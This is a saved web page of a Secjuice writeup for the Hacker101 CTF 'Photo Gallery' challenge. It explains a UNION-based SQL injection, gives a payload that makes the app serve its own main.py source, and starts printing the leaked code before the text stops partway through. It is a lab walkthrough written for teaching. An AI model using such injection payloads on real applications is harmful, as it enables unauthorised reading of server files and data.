@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>Hacker 101 CTF: Photo Gallery</title>
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" type="text/css" href="Hacker%20101%20CTF%20Photo%20Gallery_files/screen.css">
+
+    <meta name="description" content="A technical writeup of the hacker101 ctf (photo gallery). It containts the answers, so do not read if you are working on it.">
+    <link rel="icon" href="https://www.secjuice.com/favicon.png" type="image/png">
+    <link rel="canonical" href="https://www.secjuice.com/photo-gallery/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Secjuice">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Hacker 101 CTF: Photo Gallery">
+    <meta property="og:description" content="A technical writeup of the hacker101 ctf (photo gallery). It containts the answers, so do not read if you are working on it.">
+    <meta property="og:url" content="https://www.secjuice.com/photo-gallery/">
+    <meta property="og:image" content="https://www.secjuice.com/content/images/2020/08/vaderlights.jpg">
+    <meta property="article:published_time" content="2020-08-23T18:07:59.000Z">
+    <meta property="article:modified_time" content="2020-08-23T18:07:59.000Z">
+    <meta property="article:tag" content="TECHNICAL">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/secjuice">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Hacker 101 CTF: Photo Gallery">
+    <meta name="twitter:description" content="A technical writeup of the hacker101 ctf (photo gallery). It containts the answers, so do not read if you are working on it.">
+    <meta name="twitter:url" content="https://www.secjuice.com/photo-gallery/">
+    <meta name="twitter:image" content="https://www.secjuice.com/content/images/2020/08/vaderlights.jpg">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="pirateducky">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="TECHNICAL">
+    <meta name="twitter:site" content="@secjuice">
+    <meta name="twitter:creator" content="@pirateducky">
+    <meta property="og:image:width" content="1600">
+    <meta property="og:image:height" content="1200">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Secjuice",
+        "url": "https://www.secjuice.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://www.secjuice.com/content/images/2018/12/Logo-1.png"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "pirateducky",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.secjuice.com/content/images/2020/08/v5jRx1JS_400x400.jpg",
+            "width": 400,
+            "height": 400
+        },
+        "url": "https://www.secjuice.com/author/pirateducky/",
+        "sameAs": [
+            "https://twitter.com/pirateducky"
+        ]
+    },
+    "headline": "Hacker 101 CTF: Photo Gallery",
+    "url": "https://www.secjuice.com/photo-gallery/",
+    "datePublished": "2020-08-23T18:07:59.000Z",
+    "dateModified": "2020-08-23T18:07:59.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://www.secjuice.com/content/images/2020/08/vaderlights.jpg",
+        "width": 1600,
+        "height": 1200
+    },
+    "keywords": "TECHNICAL",
+    "description": "A technical writeup of the hacker101 ctf (photo gallery). It containts the answers, so do not read if you are working on it.",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.secjuice.com/"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 4.41">
+    <link rel="alternate" type="application/rss+xml" title="Secjuice" href="https://www.secjuice.com/rss/">
+    
+    <script defer="defer" src="Hacker%20101%20CTF%20Photo%20Gallery_files/cards.js"></script>
+    <link rel="stylesheet" type="text/css" href="Hacker%20101%20CTF%20Photo%20Gallery_files/cards.css">
+    <script async="" src="Hacker%20101%20CTF%20Photo%20Gallery_files/js.js"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-119868006-1');
+</script>
+
+<meta name="google-site-verification" content="lvcUQXMrKXC7eYXXwae5JdMWrn1K6t5o1YjP_4IYcKs">
+<meta name="msvalidate.01" content="8B017FF6E735701B4A11D5540AC64494">
+
+
+<style type="text/css">
+    body {
+    	font-family: 'Roboto', sans-serif; 
+    }
+    
+    ::selection {
+  		background: #763375;
+        color: white;
+	}
+    
+	::-moz-selection {
+  		background: #763375;
+        color: white;
+	}
+    
+    .post-full-content {
+    	font-family: 'Roboto', sans-serif;
+    }
+
+    .post-card-excerpt {
+    	font-family: 'Roboto', sans-serif;
+    }
+    
+    .site-logo {
+        max-height: 90px; /* where 45px is the current max height */
+		padding-bottom: 25px;
+    }
+
+	.post-full-content pre {
+        color: inherit;
+    }
+    
+	.post-content,
+    .post-content a {
+        overflow-wrap: break-word;
+        word-wrap: break-word;
+        word-break: break-word;
+        -ms-hyphens: auto;
+        -moz-hyphens: auto;
+        -webkit-hyphens: auto;
+        hyphens: auto;
+    }
+</style>
+
+
+<link rel="stylesheet" href="Hacker%20101%20CTF%20Photo%20Gallery_files/codemirror.css">
+<link rel="stylesheet" href="Hacker%20101%20CTF%20Photo%20Gallery_files/monokai.css">
+<link rel="stylesheet" href="Hacker%20101%20CTF%20Photo%20Gallery_files/neo.css">
+<link rel="stylesheet" href="Hacker%20101%20CTF%20Photo%20Gallery_files/night.css">
+<link rel="stylesheet" href="Hacker%20101%20CTF%20Photo%20Gallery_files/gruvbox-dark.css">
+
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/codemirror.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/xml.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/javascript.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/css.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/shell.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/htmlmixed.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/clike.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/php.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/python.js"></script>
+<script src="Hacker%20101%20CTF%20Photo%20Gallery_files/lua.js"></script>
+
+<style>
+.CodeMirror {
+	font-family: sans, monospace;
+	// font-size: 16px;
+    height: 100%;
+    position: relative;
+    overflow: hidden;
+    margin-bottom:30px;
+}
+.CodeMirror-scroll {
+	overflow: auto;
+	height: 100%;
+	position: relative;
+	outline: none;
+}
+</style>
+
+<style>
+.kg-card.kg-bookmark-card {
+    border: solid grey 1px;
+    padding: 0.5em;
+}
+.kg-bookmark-content,
+.kg-bookmark-thumbnail {
+    display: inline-block !important;
+    vertical-align: top !important
+}
+.kg-bookmark-content {
+    width: 75% !important;
+    }
+.kg-bookmark-thumbnail {
+    width: 25% !important;
+    }
+.kg-bookmark-title,
+.kg-bookmark-description,
+.kg-bookmark-icon,
+.kg-bookmark-author,
+.kg-bookmark-publisher{
+    font-size: 12pt !important;
+    line-height: 1 !important;
+}
+.kg-bookmark-title {
+    font-weight: bold !important;
+}
+.kg-bookmark-icon {
+    max-width: 24px !important;
+    max-height: 24px !important;
+}
+.kg-bookmark-thumbnail img {
+    max-width: 100% !important;
+    max-height: 100% !important;
+    margin: 0 !important;
+}
+.kg-bookmark-icon {
+    display: inline !important;
+}
+.kg-bookmark-author {
+    font-weight: bold !important;
+}
+.kg-bookmark-icon,
+.kg-bookmark-author,
+.kg-bookmark-publisher {
+    margin-right: 0.2em !important;
+    font-size: 10pt !important;
+}
+.kg-bookmark-container {
+    text-decoration: none !important;
+    box-shadow: none !important;
+}
+</style><style>:root {--ghost-accent-color: #15171A;}</style>
+
+<style id="fit-vids-style">.fluid-width-video-container{flex-grow: 1;width:100%;}.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}</style></head>
+<body class="post-template tag-technical">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+                <a class="site-nav-logo" href="https://www.secjuice.com/"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/Logo-1.png" alt="Secjuice"></a>
+            <ul class="nav">
+    <li class="nav-technical"><a href="https://www.secjuice.com/tag/technical/">Technical</a></li>
+    <li class="nav-osint"><a href="https://www.secjuice.com/tag/OSINT/">OSINT</a></li>
+    <li class="nav-unusual-journeys"><a href="https://www.secjuice.com/tag/unusual-journeys/">Unusual Journeys</a></li>
+    <li class="nav-hof"><a href="https://www.secjuice.com/secjuice-hall-of-fame/">HoF</a></li>
+    <li class="nav-write-with-us"><a href="https://www.secjuice.com/join-secjuice-writing-team/">Write With Us</a></li>
+    <li class="nav-hire-a-writer"><a href="https://www.secjuice.com/hire-infosec-cybersecurity-writer/">Hire A Writer</a></li>
+    <li class="nav-about-us"><a href="https://www.secjuice.com/about-us/">About Us</a></li>
+    <li class="nav-rankings"><a href="https://www.secjuice.com/secjuice-writers-ranking/">Rankings</a></li>
+</ul>
+
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+                <a class="social-link social-link-fb" href="https://www.facebook.com/secjuice" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"></path></svg>
+</a>
+                <a class="social-link social-link-tw" href="https://twitter.com/secjuice" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"></path></svg>
+</a>
+        </div>
+            <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://www.secjuice.com/rss/" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"></circle><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"></path></svg>
+</a>
+    </div>
+</nav>
+    </div>
+</header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-technical ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="2020-08-23">23 August 2020</time>
+                        <span class="date-divider">/</span> <a href="https://www.secjuice.com/tag/technical/">TECHNICAL</a>
+                </section>
+                <h1 class="post-full-title">Hacker 101 CTF: Photo Gallery</h1>
+            </header>
+
+            <figure class="post-full-image" style="background-image: url(https://www.secjuice.com/content/images/2020/08/vaderlights.jpg)">
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p>A technical writeup of the hacker101 ctf (photo 
+gallery), if you are trying to do it on your own please do not read this
+ article. I got permission to do this writeup, and I'm glad I can 
+finally share it. </p><h3 id="summary-">Summary: </h3><p>The application
+ is vulnerable to multiple SQL injections, which range from information 
+disclosure to remote code execution. This challenge is from the <a href="https://hacker101.com/" target="_blank">hacker101 CTF</a> and it is labeled as <strong>moderate</strong>. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/photogallery.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/photogallery_002.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/photogallery.png 902w" sizes="(min-width: 720px) 720px" width="902" height="59"><figcaption>difficulty of challenge: moderate, 3 flags to find</figcaption></figure><p>This
+ challenge is my favorite in the hacker101 ctf, because it took me 
+around 3 weeks to figure everything out, including a ruby script to 
+obtain one of the flags. The only tools used for this challenge were the
+ browser and ruby.</p><h3 id="application">Application</h3><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/app.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/app_002.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/app.png 989w" sizes="(min-width: 720px) 720px" width="989" height="763"></figure><p> The application loads the above page, by looking at the source code we can see some more information: </p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 34px;"><textarea style="position: absolute; bottom: -1em; padding: 0px; width: 1px; height: 1em; outline: currentcolor none medium;" autocorrect="off" autocapitalize="none" spellcheck="false" tabindex="0" wrap="off"></textarea></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 18px; min-height: 134px; min-width: 360.367px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 4px; top: 0px; height: 21px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">&lt;!doctype html&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">&lt;html&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">    // including relevant part</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">        &lt;img src="fetch?id=1" width="266" height="150"&gt;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation">&lt;/html&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 18px; width: 1px; border-bottom: 0px solid transparent; top: 134px;"></div><div class="CodeMirror-gutters" style="height: 152px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div></div></code></pre><p>The html source code shows that the images are being loaded by using a route that looks like <code>/fetch?id=1</code> The <code>id</code>
+ paramer will pass an integer as a query parameter, which is then used 
+to look up the correct filename for the images. Something to note is 
+that the last image in the application is broken, just remeber that for 
+now.</p><p>With that information let's get into how to obtain the three 
+flags hidden in this challenge, we need three different kinds on SQL 
+injection here.</p><h3 id="flag-0-union">Flag 0: UNION</h3><p>Let's starts with the hints</p><figure class="kg-card kg-image-card"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag0tips.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/flag0tips_002.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag0tips.png 740w" sizes="(min-width: 720px) 720px" width="740" height="158"></figure><p>I
+ had to craft a union that took in a wrong id and then executed a union 
+where I passed down the path to main.py which is where everything 
+happens.</p><p>First we are given in the hints that this is a docker image, which is documented here:<br><a href="https://github.com/tiangolo/uwsgi-nginx-flask-docker" target="_blank">https://github.com/tiangolo/uwsgi-nginx-flask-docker</a></p><p>Then by looking at the app, in order to grab the images from the server the following is used <code>fetch?id=1</code><br>This is an indication that we should test for a SQLi, by using the hints we can see that this will require a <code>UNION</code>.</p><p>We have look at how the <code>UNION</code> command works in SQL: </p><p><strong>Union based attack:</strong>
+ Union based SQL injection allows an attacker to extract information 
+from the database by extending the results returned by the original 
+query. The Union operator can only be used if the original/new queries 
+have the same structure (number and data type of columns). (<a href="https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql)%C2%A0" target="_blank">https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql)</a></p><p>Now we think how would this query work? And start coming up with some theories:</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>SELECT image_name FROM a_table WHERE id=number</code></pre><p>This
+ query will return the file name and then this file name will be looked 
+up and returned, so using a union we might be able to trick the DB into 
+handing us some other files if we just give it a filename that is 
+interesting - this is where that docker image comes in handy, we know 
+there is a <code>main.py</code> file and we also know the file structure - so here is my payload:</p><p> I had to give it an id that didn’t exist so my UNION would work.</p><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code>/fetch?id=-1 UNION select '/../../main.py'</code></pre><p>This payload executes the SQL statement, and happily gives you the file we need:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="Hacker%20101%20CTF%20Photo%20Gallery_files/flag0_002.png" class="kg-image" alt="" loading="lazy" srcset="Hacker%20101%20CTF%20Photo%20Gallery_files/flag0_004.png 600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag0.png 1000w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag0_003.png 1600w, Hacker%20101%20CTF%20Photo%20Gallery_files/flag0_002.png 1904w" sizes="(min-width: 720px) 720px" width="1904" height="573"><figcaption>flag0 in source code leak</figcaption></figure><pre style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><code><div class="CodeMirror cm-s-default"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 34px;"><textarea style="position: absolute; bottom: -1em; padding: 0px; width: 1px; height: 1em; outline: currentcolor none medium;" autocorrect="off" autocapitalize="none" spellcheck="false" tabindex="0" wrap="off"></textarea></div><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true" style="bottom: 12px;"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 30px;"><div style="height: 100%; min-height: 1px; width: 1171px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true" style="height: 12px; width: 12px;"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1" draggable="true"><div class="CodeMirror-sizer" style="margin-left: 30px; margin-bottom: -12px; border-right-width: 18px; min-height: 701px; min-width: 1171.38px; padding-right: 0px; padding-bottom: 12px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div style="position: relative; outline: currentcolor none medium;" role="presentation"><div class="CodeMirror-measure"><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>33</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor" style="left: 4px; top: 0px; height: 21px;">&nbsp;</div></div><div class="CodeMirror-code" role="presentation" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-meta">@app</span>.<span class="cm-property">route</span>(<span class="cm-string">'/'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-keyword">def</span> <span class="cm-def">index</span>():</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">cur</span> <span class="cm-operator">=</span> <span class="cm-variable">getDb</span>().<span class="cm-property">cursor</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">cur</span>.<span class="cm-property">execute</span>(<span class="cm-string">'SELECT id, title FROM albums'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">albums</span> <span class="cm-operator">=</span> <span class="cm-builtin">list</span>(<span class="cm-variable">cur</span>.<span class="cm-property">fetchall</span>())</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span cm-text="">​</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">=</span> <span class="cm-string">''</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">for</span> <span class="cm-builtin">id</span>, <span class="cm-variable">title</span> <span class="cm-keyword">in</span> <span class="cm-variable">albums</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;h2&gt;%s&lt;/h2&gt;\n'</span> <span class="cm-operator">%</span> <span class="cm-variable">sanitize</span>(<span class="cm-variable">title</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;div&gt;'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">11</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">cur</span>.<span class="cm-property">execute</span>(<span class="cm-string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span>, (<span class="cm-builtin">id</span>, ))</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">12</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">fns</span> <span class="cm-operator">=</span> []</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">13</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-keyword">for</span> <span class="cm-variable">pid</span>, <span class="cm-variable">ptitle</span>, <span class="cm-variable">pfn</span> <span class="cm-keyword">in</span> <span class="cm-variable">cur</span>.<span class="cm-property">fetchall</span>():</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">14</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span class="cm-string">'&lt;div&gt;&lt;img src="fetch?id=%i" width="266" height="150"&gt;&lt;br&gt;%s&lt;/div&gt;'</span> <span class="cm-operator">%</span> (<span class="cm-variable">pid</span>, <span class="cm-variable">sanitize</span>(<span class="cm-variable">ptitle</span>))</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">15</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">fns</span>.<span class="cm-property">append</span>(<span class="cm-variable">pfn</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -30px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">16</div></div><pre role="presentation" style="background-color: transparent; border: medium none; padding: 0px 0px 0px 10px; margin: 0px;"><span role="presentation"><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">rep</span> <span class="cm-operator">+=</span> <span 